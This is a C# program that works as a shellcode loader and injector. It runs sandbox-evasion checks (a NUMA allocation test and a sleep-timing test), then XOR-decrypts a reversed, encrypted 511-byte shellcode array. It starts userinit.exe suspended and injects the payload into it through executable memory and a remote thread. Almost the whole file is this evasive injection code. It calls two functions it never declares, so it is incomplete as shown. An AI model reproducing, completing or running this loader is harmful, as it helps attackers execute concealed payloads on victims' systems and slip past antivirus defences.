
using System.Diagnostics;
using System.Runtime.InteropServices;
using System;
using System.Text;
public class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public class SecurityAttributes
    {
        public Int32 Length = 0;
        public IntPtr lpSecurityDescriptor = IntPtr.Zero;
        public bool bInheritHandle = false;

        public SecurityAttributes()
        {
            this.Length = Marshal.SizeOf(this);
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInformation
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }
    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }


    [StructLayout(LayoutKind.Sequential)]
    public class StartupInfo
    {
        public Int32 cb = 0;
        public IntPtr lpReserved = IntPtr.Zero;
        public IntPtr lpDesktop = IntPtr.Zero;
        public IntPtr lpTitle = IntPtr.Zero;
        public Int32 dwX = 0;
        public Int32 dwY = 0;
        public Int32 dwXSize = 0;
        public Int32 dwYSize = 0;
        public Int32 dwXCountChars = 0;
        public Int32 dwYCountChars = 0;
        public Int32 dwFillAttribute = 0;
        public Int32 dwFlags = 0;
        public Int16 wShowWindow = 0;
        public Int16 cbReserved2 = 0;
        public IntPtr lpReserved2 = IntPtr.Zero;
        public IntPtr hStdInput = IntPtr.Zero;
        public IntPtr hStdOutput = IntPtr.Zero;
        public IntPtr hStdError = IntPtr.Zero;
        public StartupInfo()
        {
            this.cb = Marshal.SizeOf(this);
        }
    }
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation

        );

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    private static UInt32 MEM_COMMIT = 0x1000;

    public static void Main()

    {

        IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
            return;
        }
        
        DateTime time1 = DateTime.Now;
        Sleep(2000);
        double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
        if (time2 < 1.5)
        {
            Console.WriteLine("(Sleep) [-] Failed check");
            return;
        }
        
        static byte[] xor(byte[] cipher, byte[] key)
        {
        byte[] xored = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return xored;
        }
        
        string key = "TAMSIKUNOSF";

        System.Threading.Thread.Sleep(3000);
            // This shellcode byte is the encrypted output from encryptor.exe

        byte[] sc = new byte[511] {0x9c, 0xac, 0x97, 0xc8, 0x15, 0x4c, 0x79, 0x52, 0xae, 0xee, 0x12, 0x49, 0x39, 0x15, 0xa6, 0xab, 0x07, 0xe7, 0x3a, 0xb8, 0xd0, 0x03, 0x8f, 0x7a, 0x05, 0x82, 0x55, 0x0e, 0xac, 0xb0, 0xb1, 0x69, 0xa2, 0x87, 0xac, 0x04, 0x94, 0xab, 0x27, 0x1e, 0x21, 0x3b, 0xef, 0x0a, 0x10, 0x04, 0x98, 0xbe, 0x64, 0x49, 0x7c, 0x44, 0xf4, 0x14, 0x11, 0x49, 0x39, 0x15, 0x00, 0x54, 0x46, 0x13, 0x4f, 0x26, 0x0c, 0x1c, 0x08, 0x0b, 0x65, 0x3c, 0x54, 0xbe, 0xd0, 0x9a, 0xb1, 0x0a, 0x83, 0x90, 0x51, 0xf7, 0x00, 0xad, 0xcf, 0x1b, 0x95, 0xc7, 0x1d, 0xbb, 0xc0, 0x1a, 0x84, 0x70, 0x19, 0x81, 0xda, 0x06, 0x8d, 0xdc, 0x03, 0x9c, 0xac, 0xa8, 0x12, 0xf0, 0x1e, 0xe9, 0x0e, 0x87, 0x64, 0x03, 0xbb, 0xda, 0x05, 0x19, 0x15, 0x46, 0x53, 0x5f, 0x4e, 0x3d, 0x12, 0x08, 0x13, 0x27, 0xb7, 0xdd, 0x18, 0x73, 0x8b, 0xcd, 0x1d, 0x1e, 0x37, 0x53, 0xb5, 0xc2, 0x81, 0xb9, 0x0c, 0x87, 0x97, 0x57, 0xf1, 0x08, 0xaa, 0xc4, 0x09, 0x0c, 0x07, 0x57, 0x25, 0x87, 0x64, 0x06, 0xab, 0xda, 0x05, 0x51, 0xb8, 0xc5, 0x1b, 0x4f, 0x4e, 0x55, 0xd8, 0xa1, 0xb6, 0x38, 0x8f, 0xab, 0x0f, 0x59, 0x3b, 0x8e, 0xd0, 0x9e, 0xb6, 0x32, 0x39, 0xe4, 0xcd, 0xfc, 0x12, 0xb6, 0xc7, 0x1d, 0xa9, 0xc0, 0x1f, 0x15, 0x00, 0x44, 0x2c, 0x94, 0xc6, 0x06, 0x80, 0xb4, 0xa9, 0x8c, 0x42, 0xab, 0xee, 0x07, 0x92, 0xc6, 0x06, 0x95, 0xb4, 0x01, 0x91, 0xc4, 0x09, 0x94, 0xb9, 0x1b, 0x8f, 0x7f, 0x18, 0x82, 0x78, 0x1e, 0x1d, 0x11, 0x0a, 0x07, 0x59, 0x25, 0x9b, 0xaa, 0x4b, 0x22, 0xd3, 0x64, 0xfb, 0x15, 0x1f, 0x53, 0x4f, 0x4f, 0x54, 0x23, 0xa3, 0xda, 0x01, 0x94, 0xab, 0x41, 0x75, 0x38, 0x02, 0xef, 0x0a, 0xb8, 0xda, 0x01, 0xa5, 0xdd, 0x0f, 0x07, 0x0e, 0x41, 0x54, 0x4a, 0x5d, 0xc3, 0x52, 0x41, 0x56, 0xfa, 0x1a, 0xaa, 0xc7, 0x1c, 0x4b, 0x49, 0x52, 0xed, 0xad, 0xd5, 0x0e, 0xb5, 0xc6, 0x07, 0x03, 0x0a, 0x49, 0x53, 0x7f, 0x72, 0x0b, 0x74, 0x20, 0x38, 0xf0, 0x1c, 0x16, 0xb6, 0xac, 0xb2, 0x0a, 0xbd, 0x54, 0xd8, 0x07, 0x14, 0x0c, 0x0a, 0x11, 0xb3, 0xb2, 0x13, 0x15, 0x66, 0xbf, 0xcc, 0x06, 0x0f, 0x0a, 0x10, 0x12, 0x15, 0x00, 0x0e, 0x1f, 0x0d, 0x17, 0x0f, 0x0d, 0x0a, 0x99, 0x52, 0x05, 0xc9, 0x50, 0xcd, 0x12, 0x9f, 0x4f, 0x1c, 0x57, 0x09, 0xd8, 0x09, 0x09, 0x58, 0xcd, 0x12, 0x29, 0x9e, 0x54, 0x02, 0x6d, 0x13, 0xc6, 0x05, 0x0c, 0x9e, 0x26, 0x9e, 0x77, 0x10, 0x43, 0x6d, 0x1f, 0x4e, 0x0d, 0xa5, 0x33, 0xb3, 0x77, 0x8f, 0x54, 0x0a, 0x44, 0x9a, 0x8c, 0x00, 0xf8, 0x86, 0x62, 0x07, 0x87, 0x64, 0x06, 0x9f, 0x52, 0x05, 0xc9, 0x60, 0xcd, 0x12, 0x86, 0xb1, 0x1d, 0x1d, 0xaa, 0x4b, 0x05, 0xca, 0x84, 0x47, 0x1a, 0x1f, 0x6e, 0x15, 0xc0, 0x0d, 0x83, 0x4c, 0x09, 0x33, 0x32, 0x93, 0xca, 0x06, 0x55, 0x4b, 0x49, 0xdb, 0xcd, 0xca, 0x54, 0x46, 0x53, 0x3d, 0xcb, 0x5a, 0x49, 0x42, 0x4b, 0x35, 0xc0, 0x32, 0x96, 0x52, 0x07, 0x72, 0x17, 0xc0, 0x69, 0x01, 0xc6, 0x09, 0x05, 0x07, 0x01, 0xa2, 0xac, 0x94, 0x4a, 0x08, 0x5e, 0x84, 0x80, 0x15, 0x66, 0x7f, 0x4d, 0x32, 0x34, 0x77, 0xe5, 0x93, 0x7c, 0x09, 0x9d, 0x77, 0x1e, 0x05, 0x04, 0xe2, 0x44, 0x01, 0x03, 0x3f, 0xca, 0x1c, 0x10, 0x73, 0x1d, 0xc5, 0x1d, 0x1a, 0x51, 0x01, 0xc6, 0x09, 0x34, 0x14, 0xd8, 0x07, 0x2b, 0x87, 0x7a, 0x01, 0x01, 0x1d, 0x00, 0x05, 0x07, 0x53, 0x4f, 0x4e, 0x99, 0xa3, 0xb9, 0xb7, 0xce, 0x09, 0xa8};

        Array.Reverse(sc);

        byte[] royan;
        royan = xor(sc, Encoding.ASCII.GetBytes(key));
            
        var prajwal = royan;
        string binary = "userinit.exe";

        Int32 size = prajwal.Length;
        StartupInfo sInfo = new StartupInfo();
        sInfo.dwFlags = 0;
        ProcessInformation pInfo;
        string binaryPath = "C:\\Windows\\System32\\" + binary;
        IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
        IntPtr hProcess = pInfo.hProcess;
        IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        int test = 0;
        IntPtr size2 = new IntPtr(prajwal.Length);
        bool bWrite = WriteProcessMemory(hProcess, spaceAddr, prajwal, size2, test);
        CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
    }
}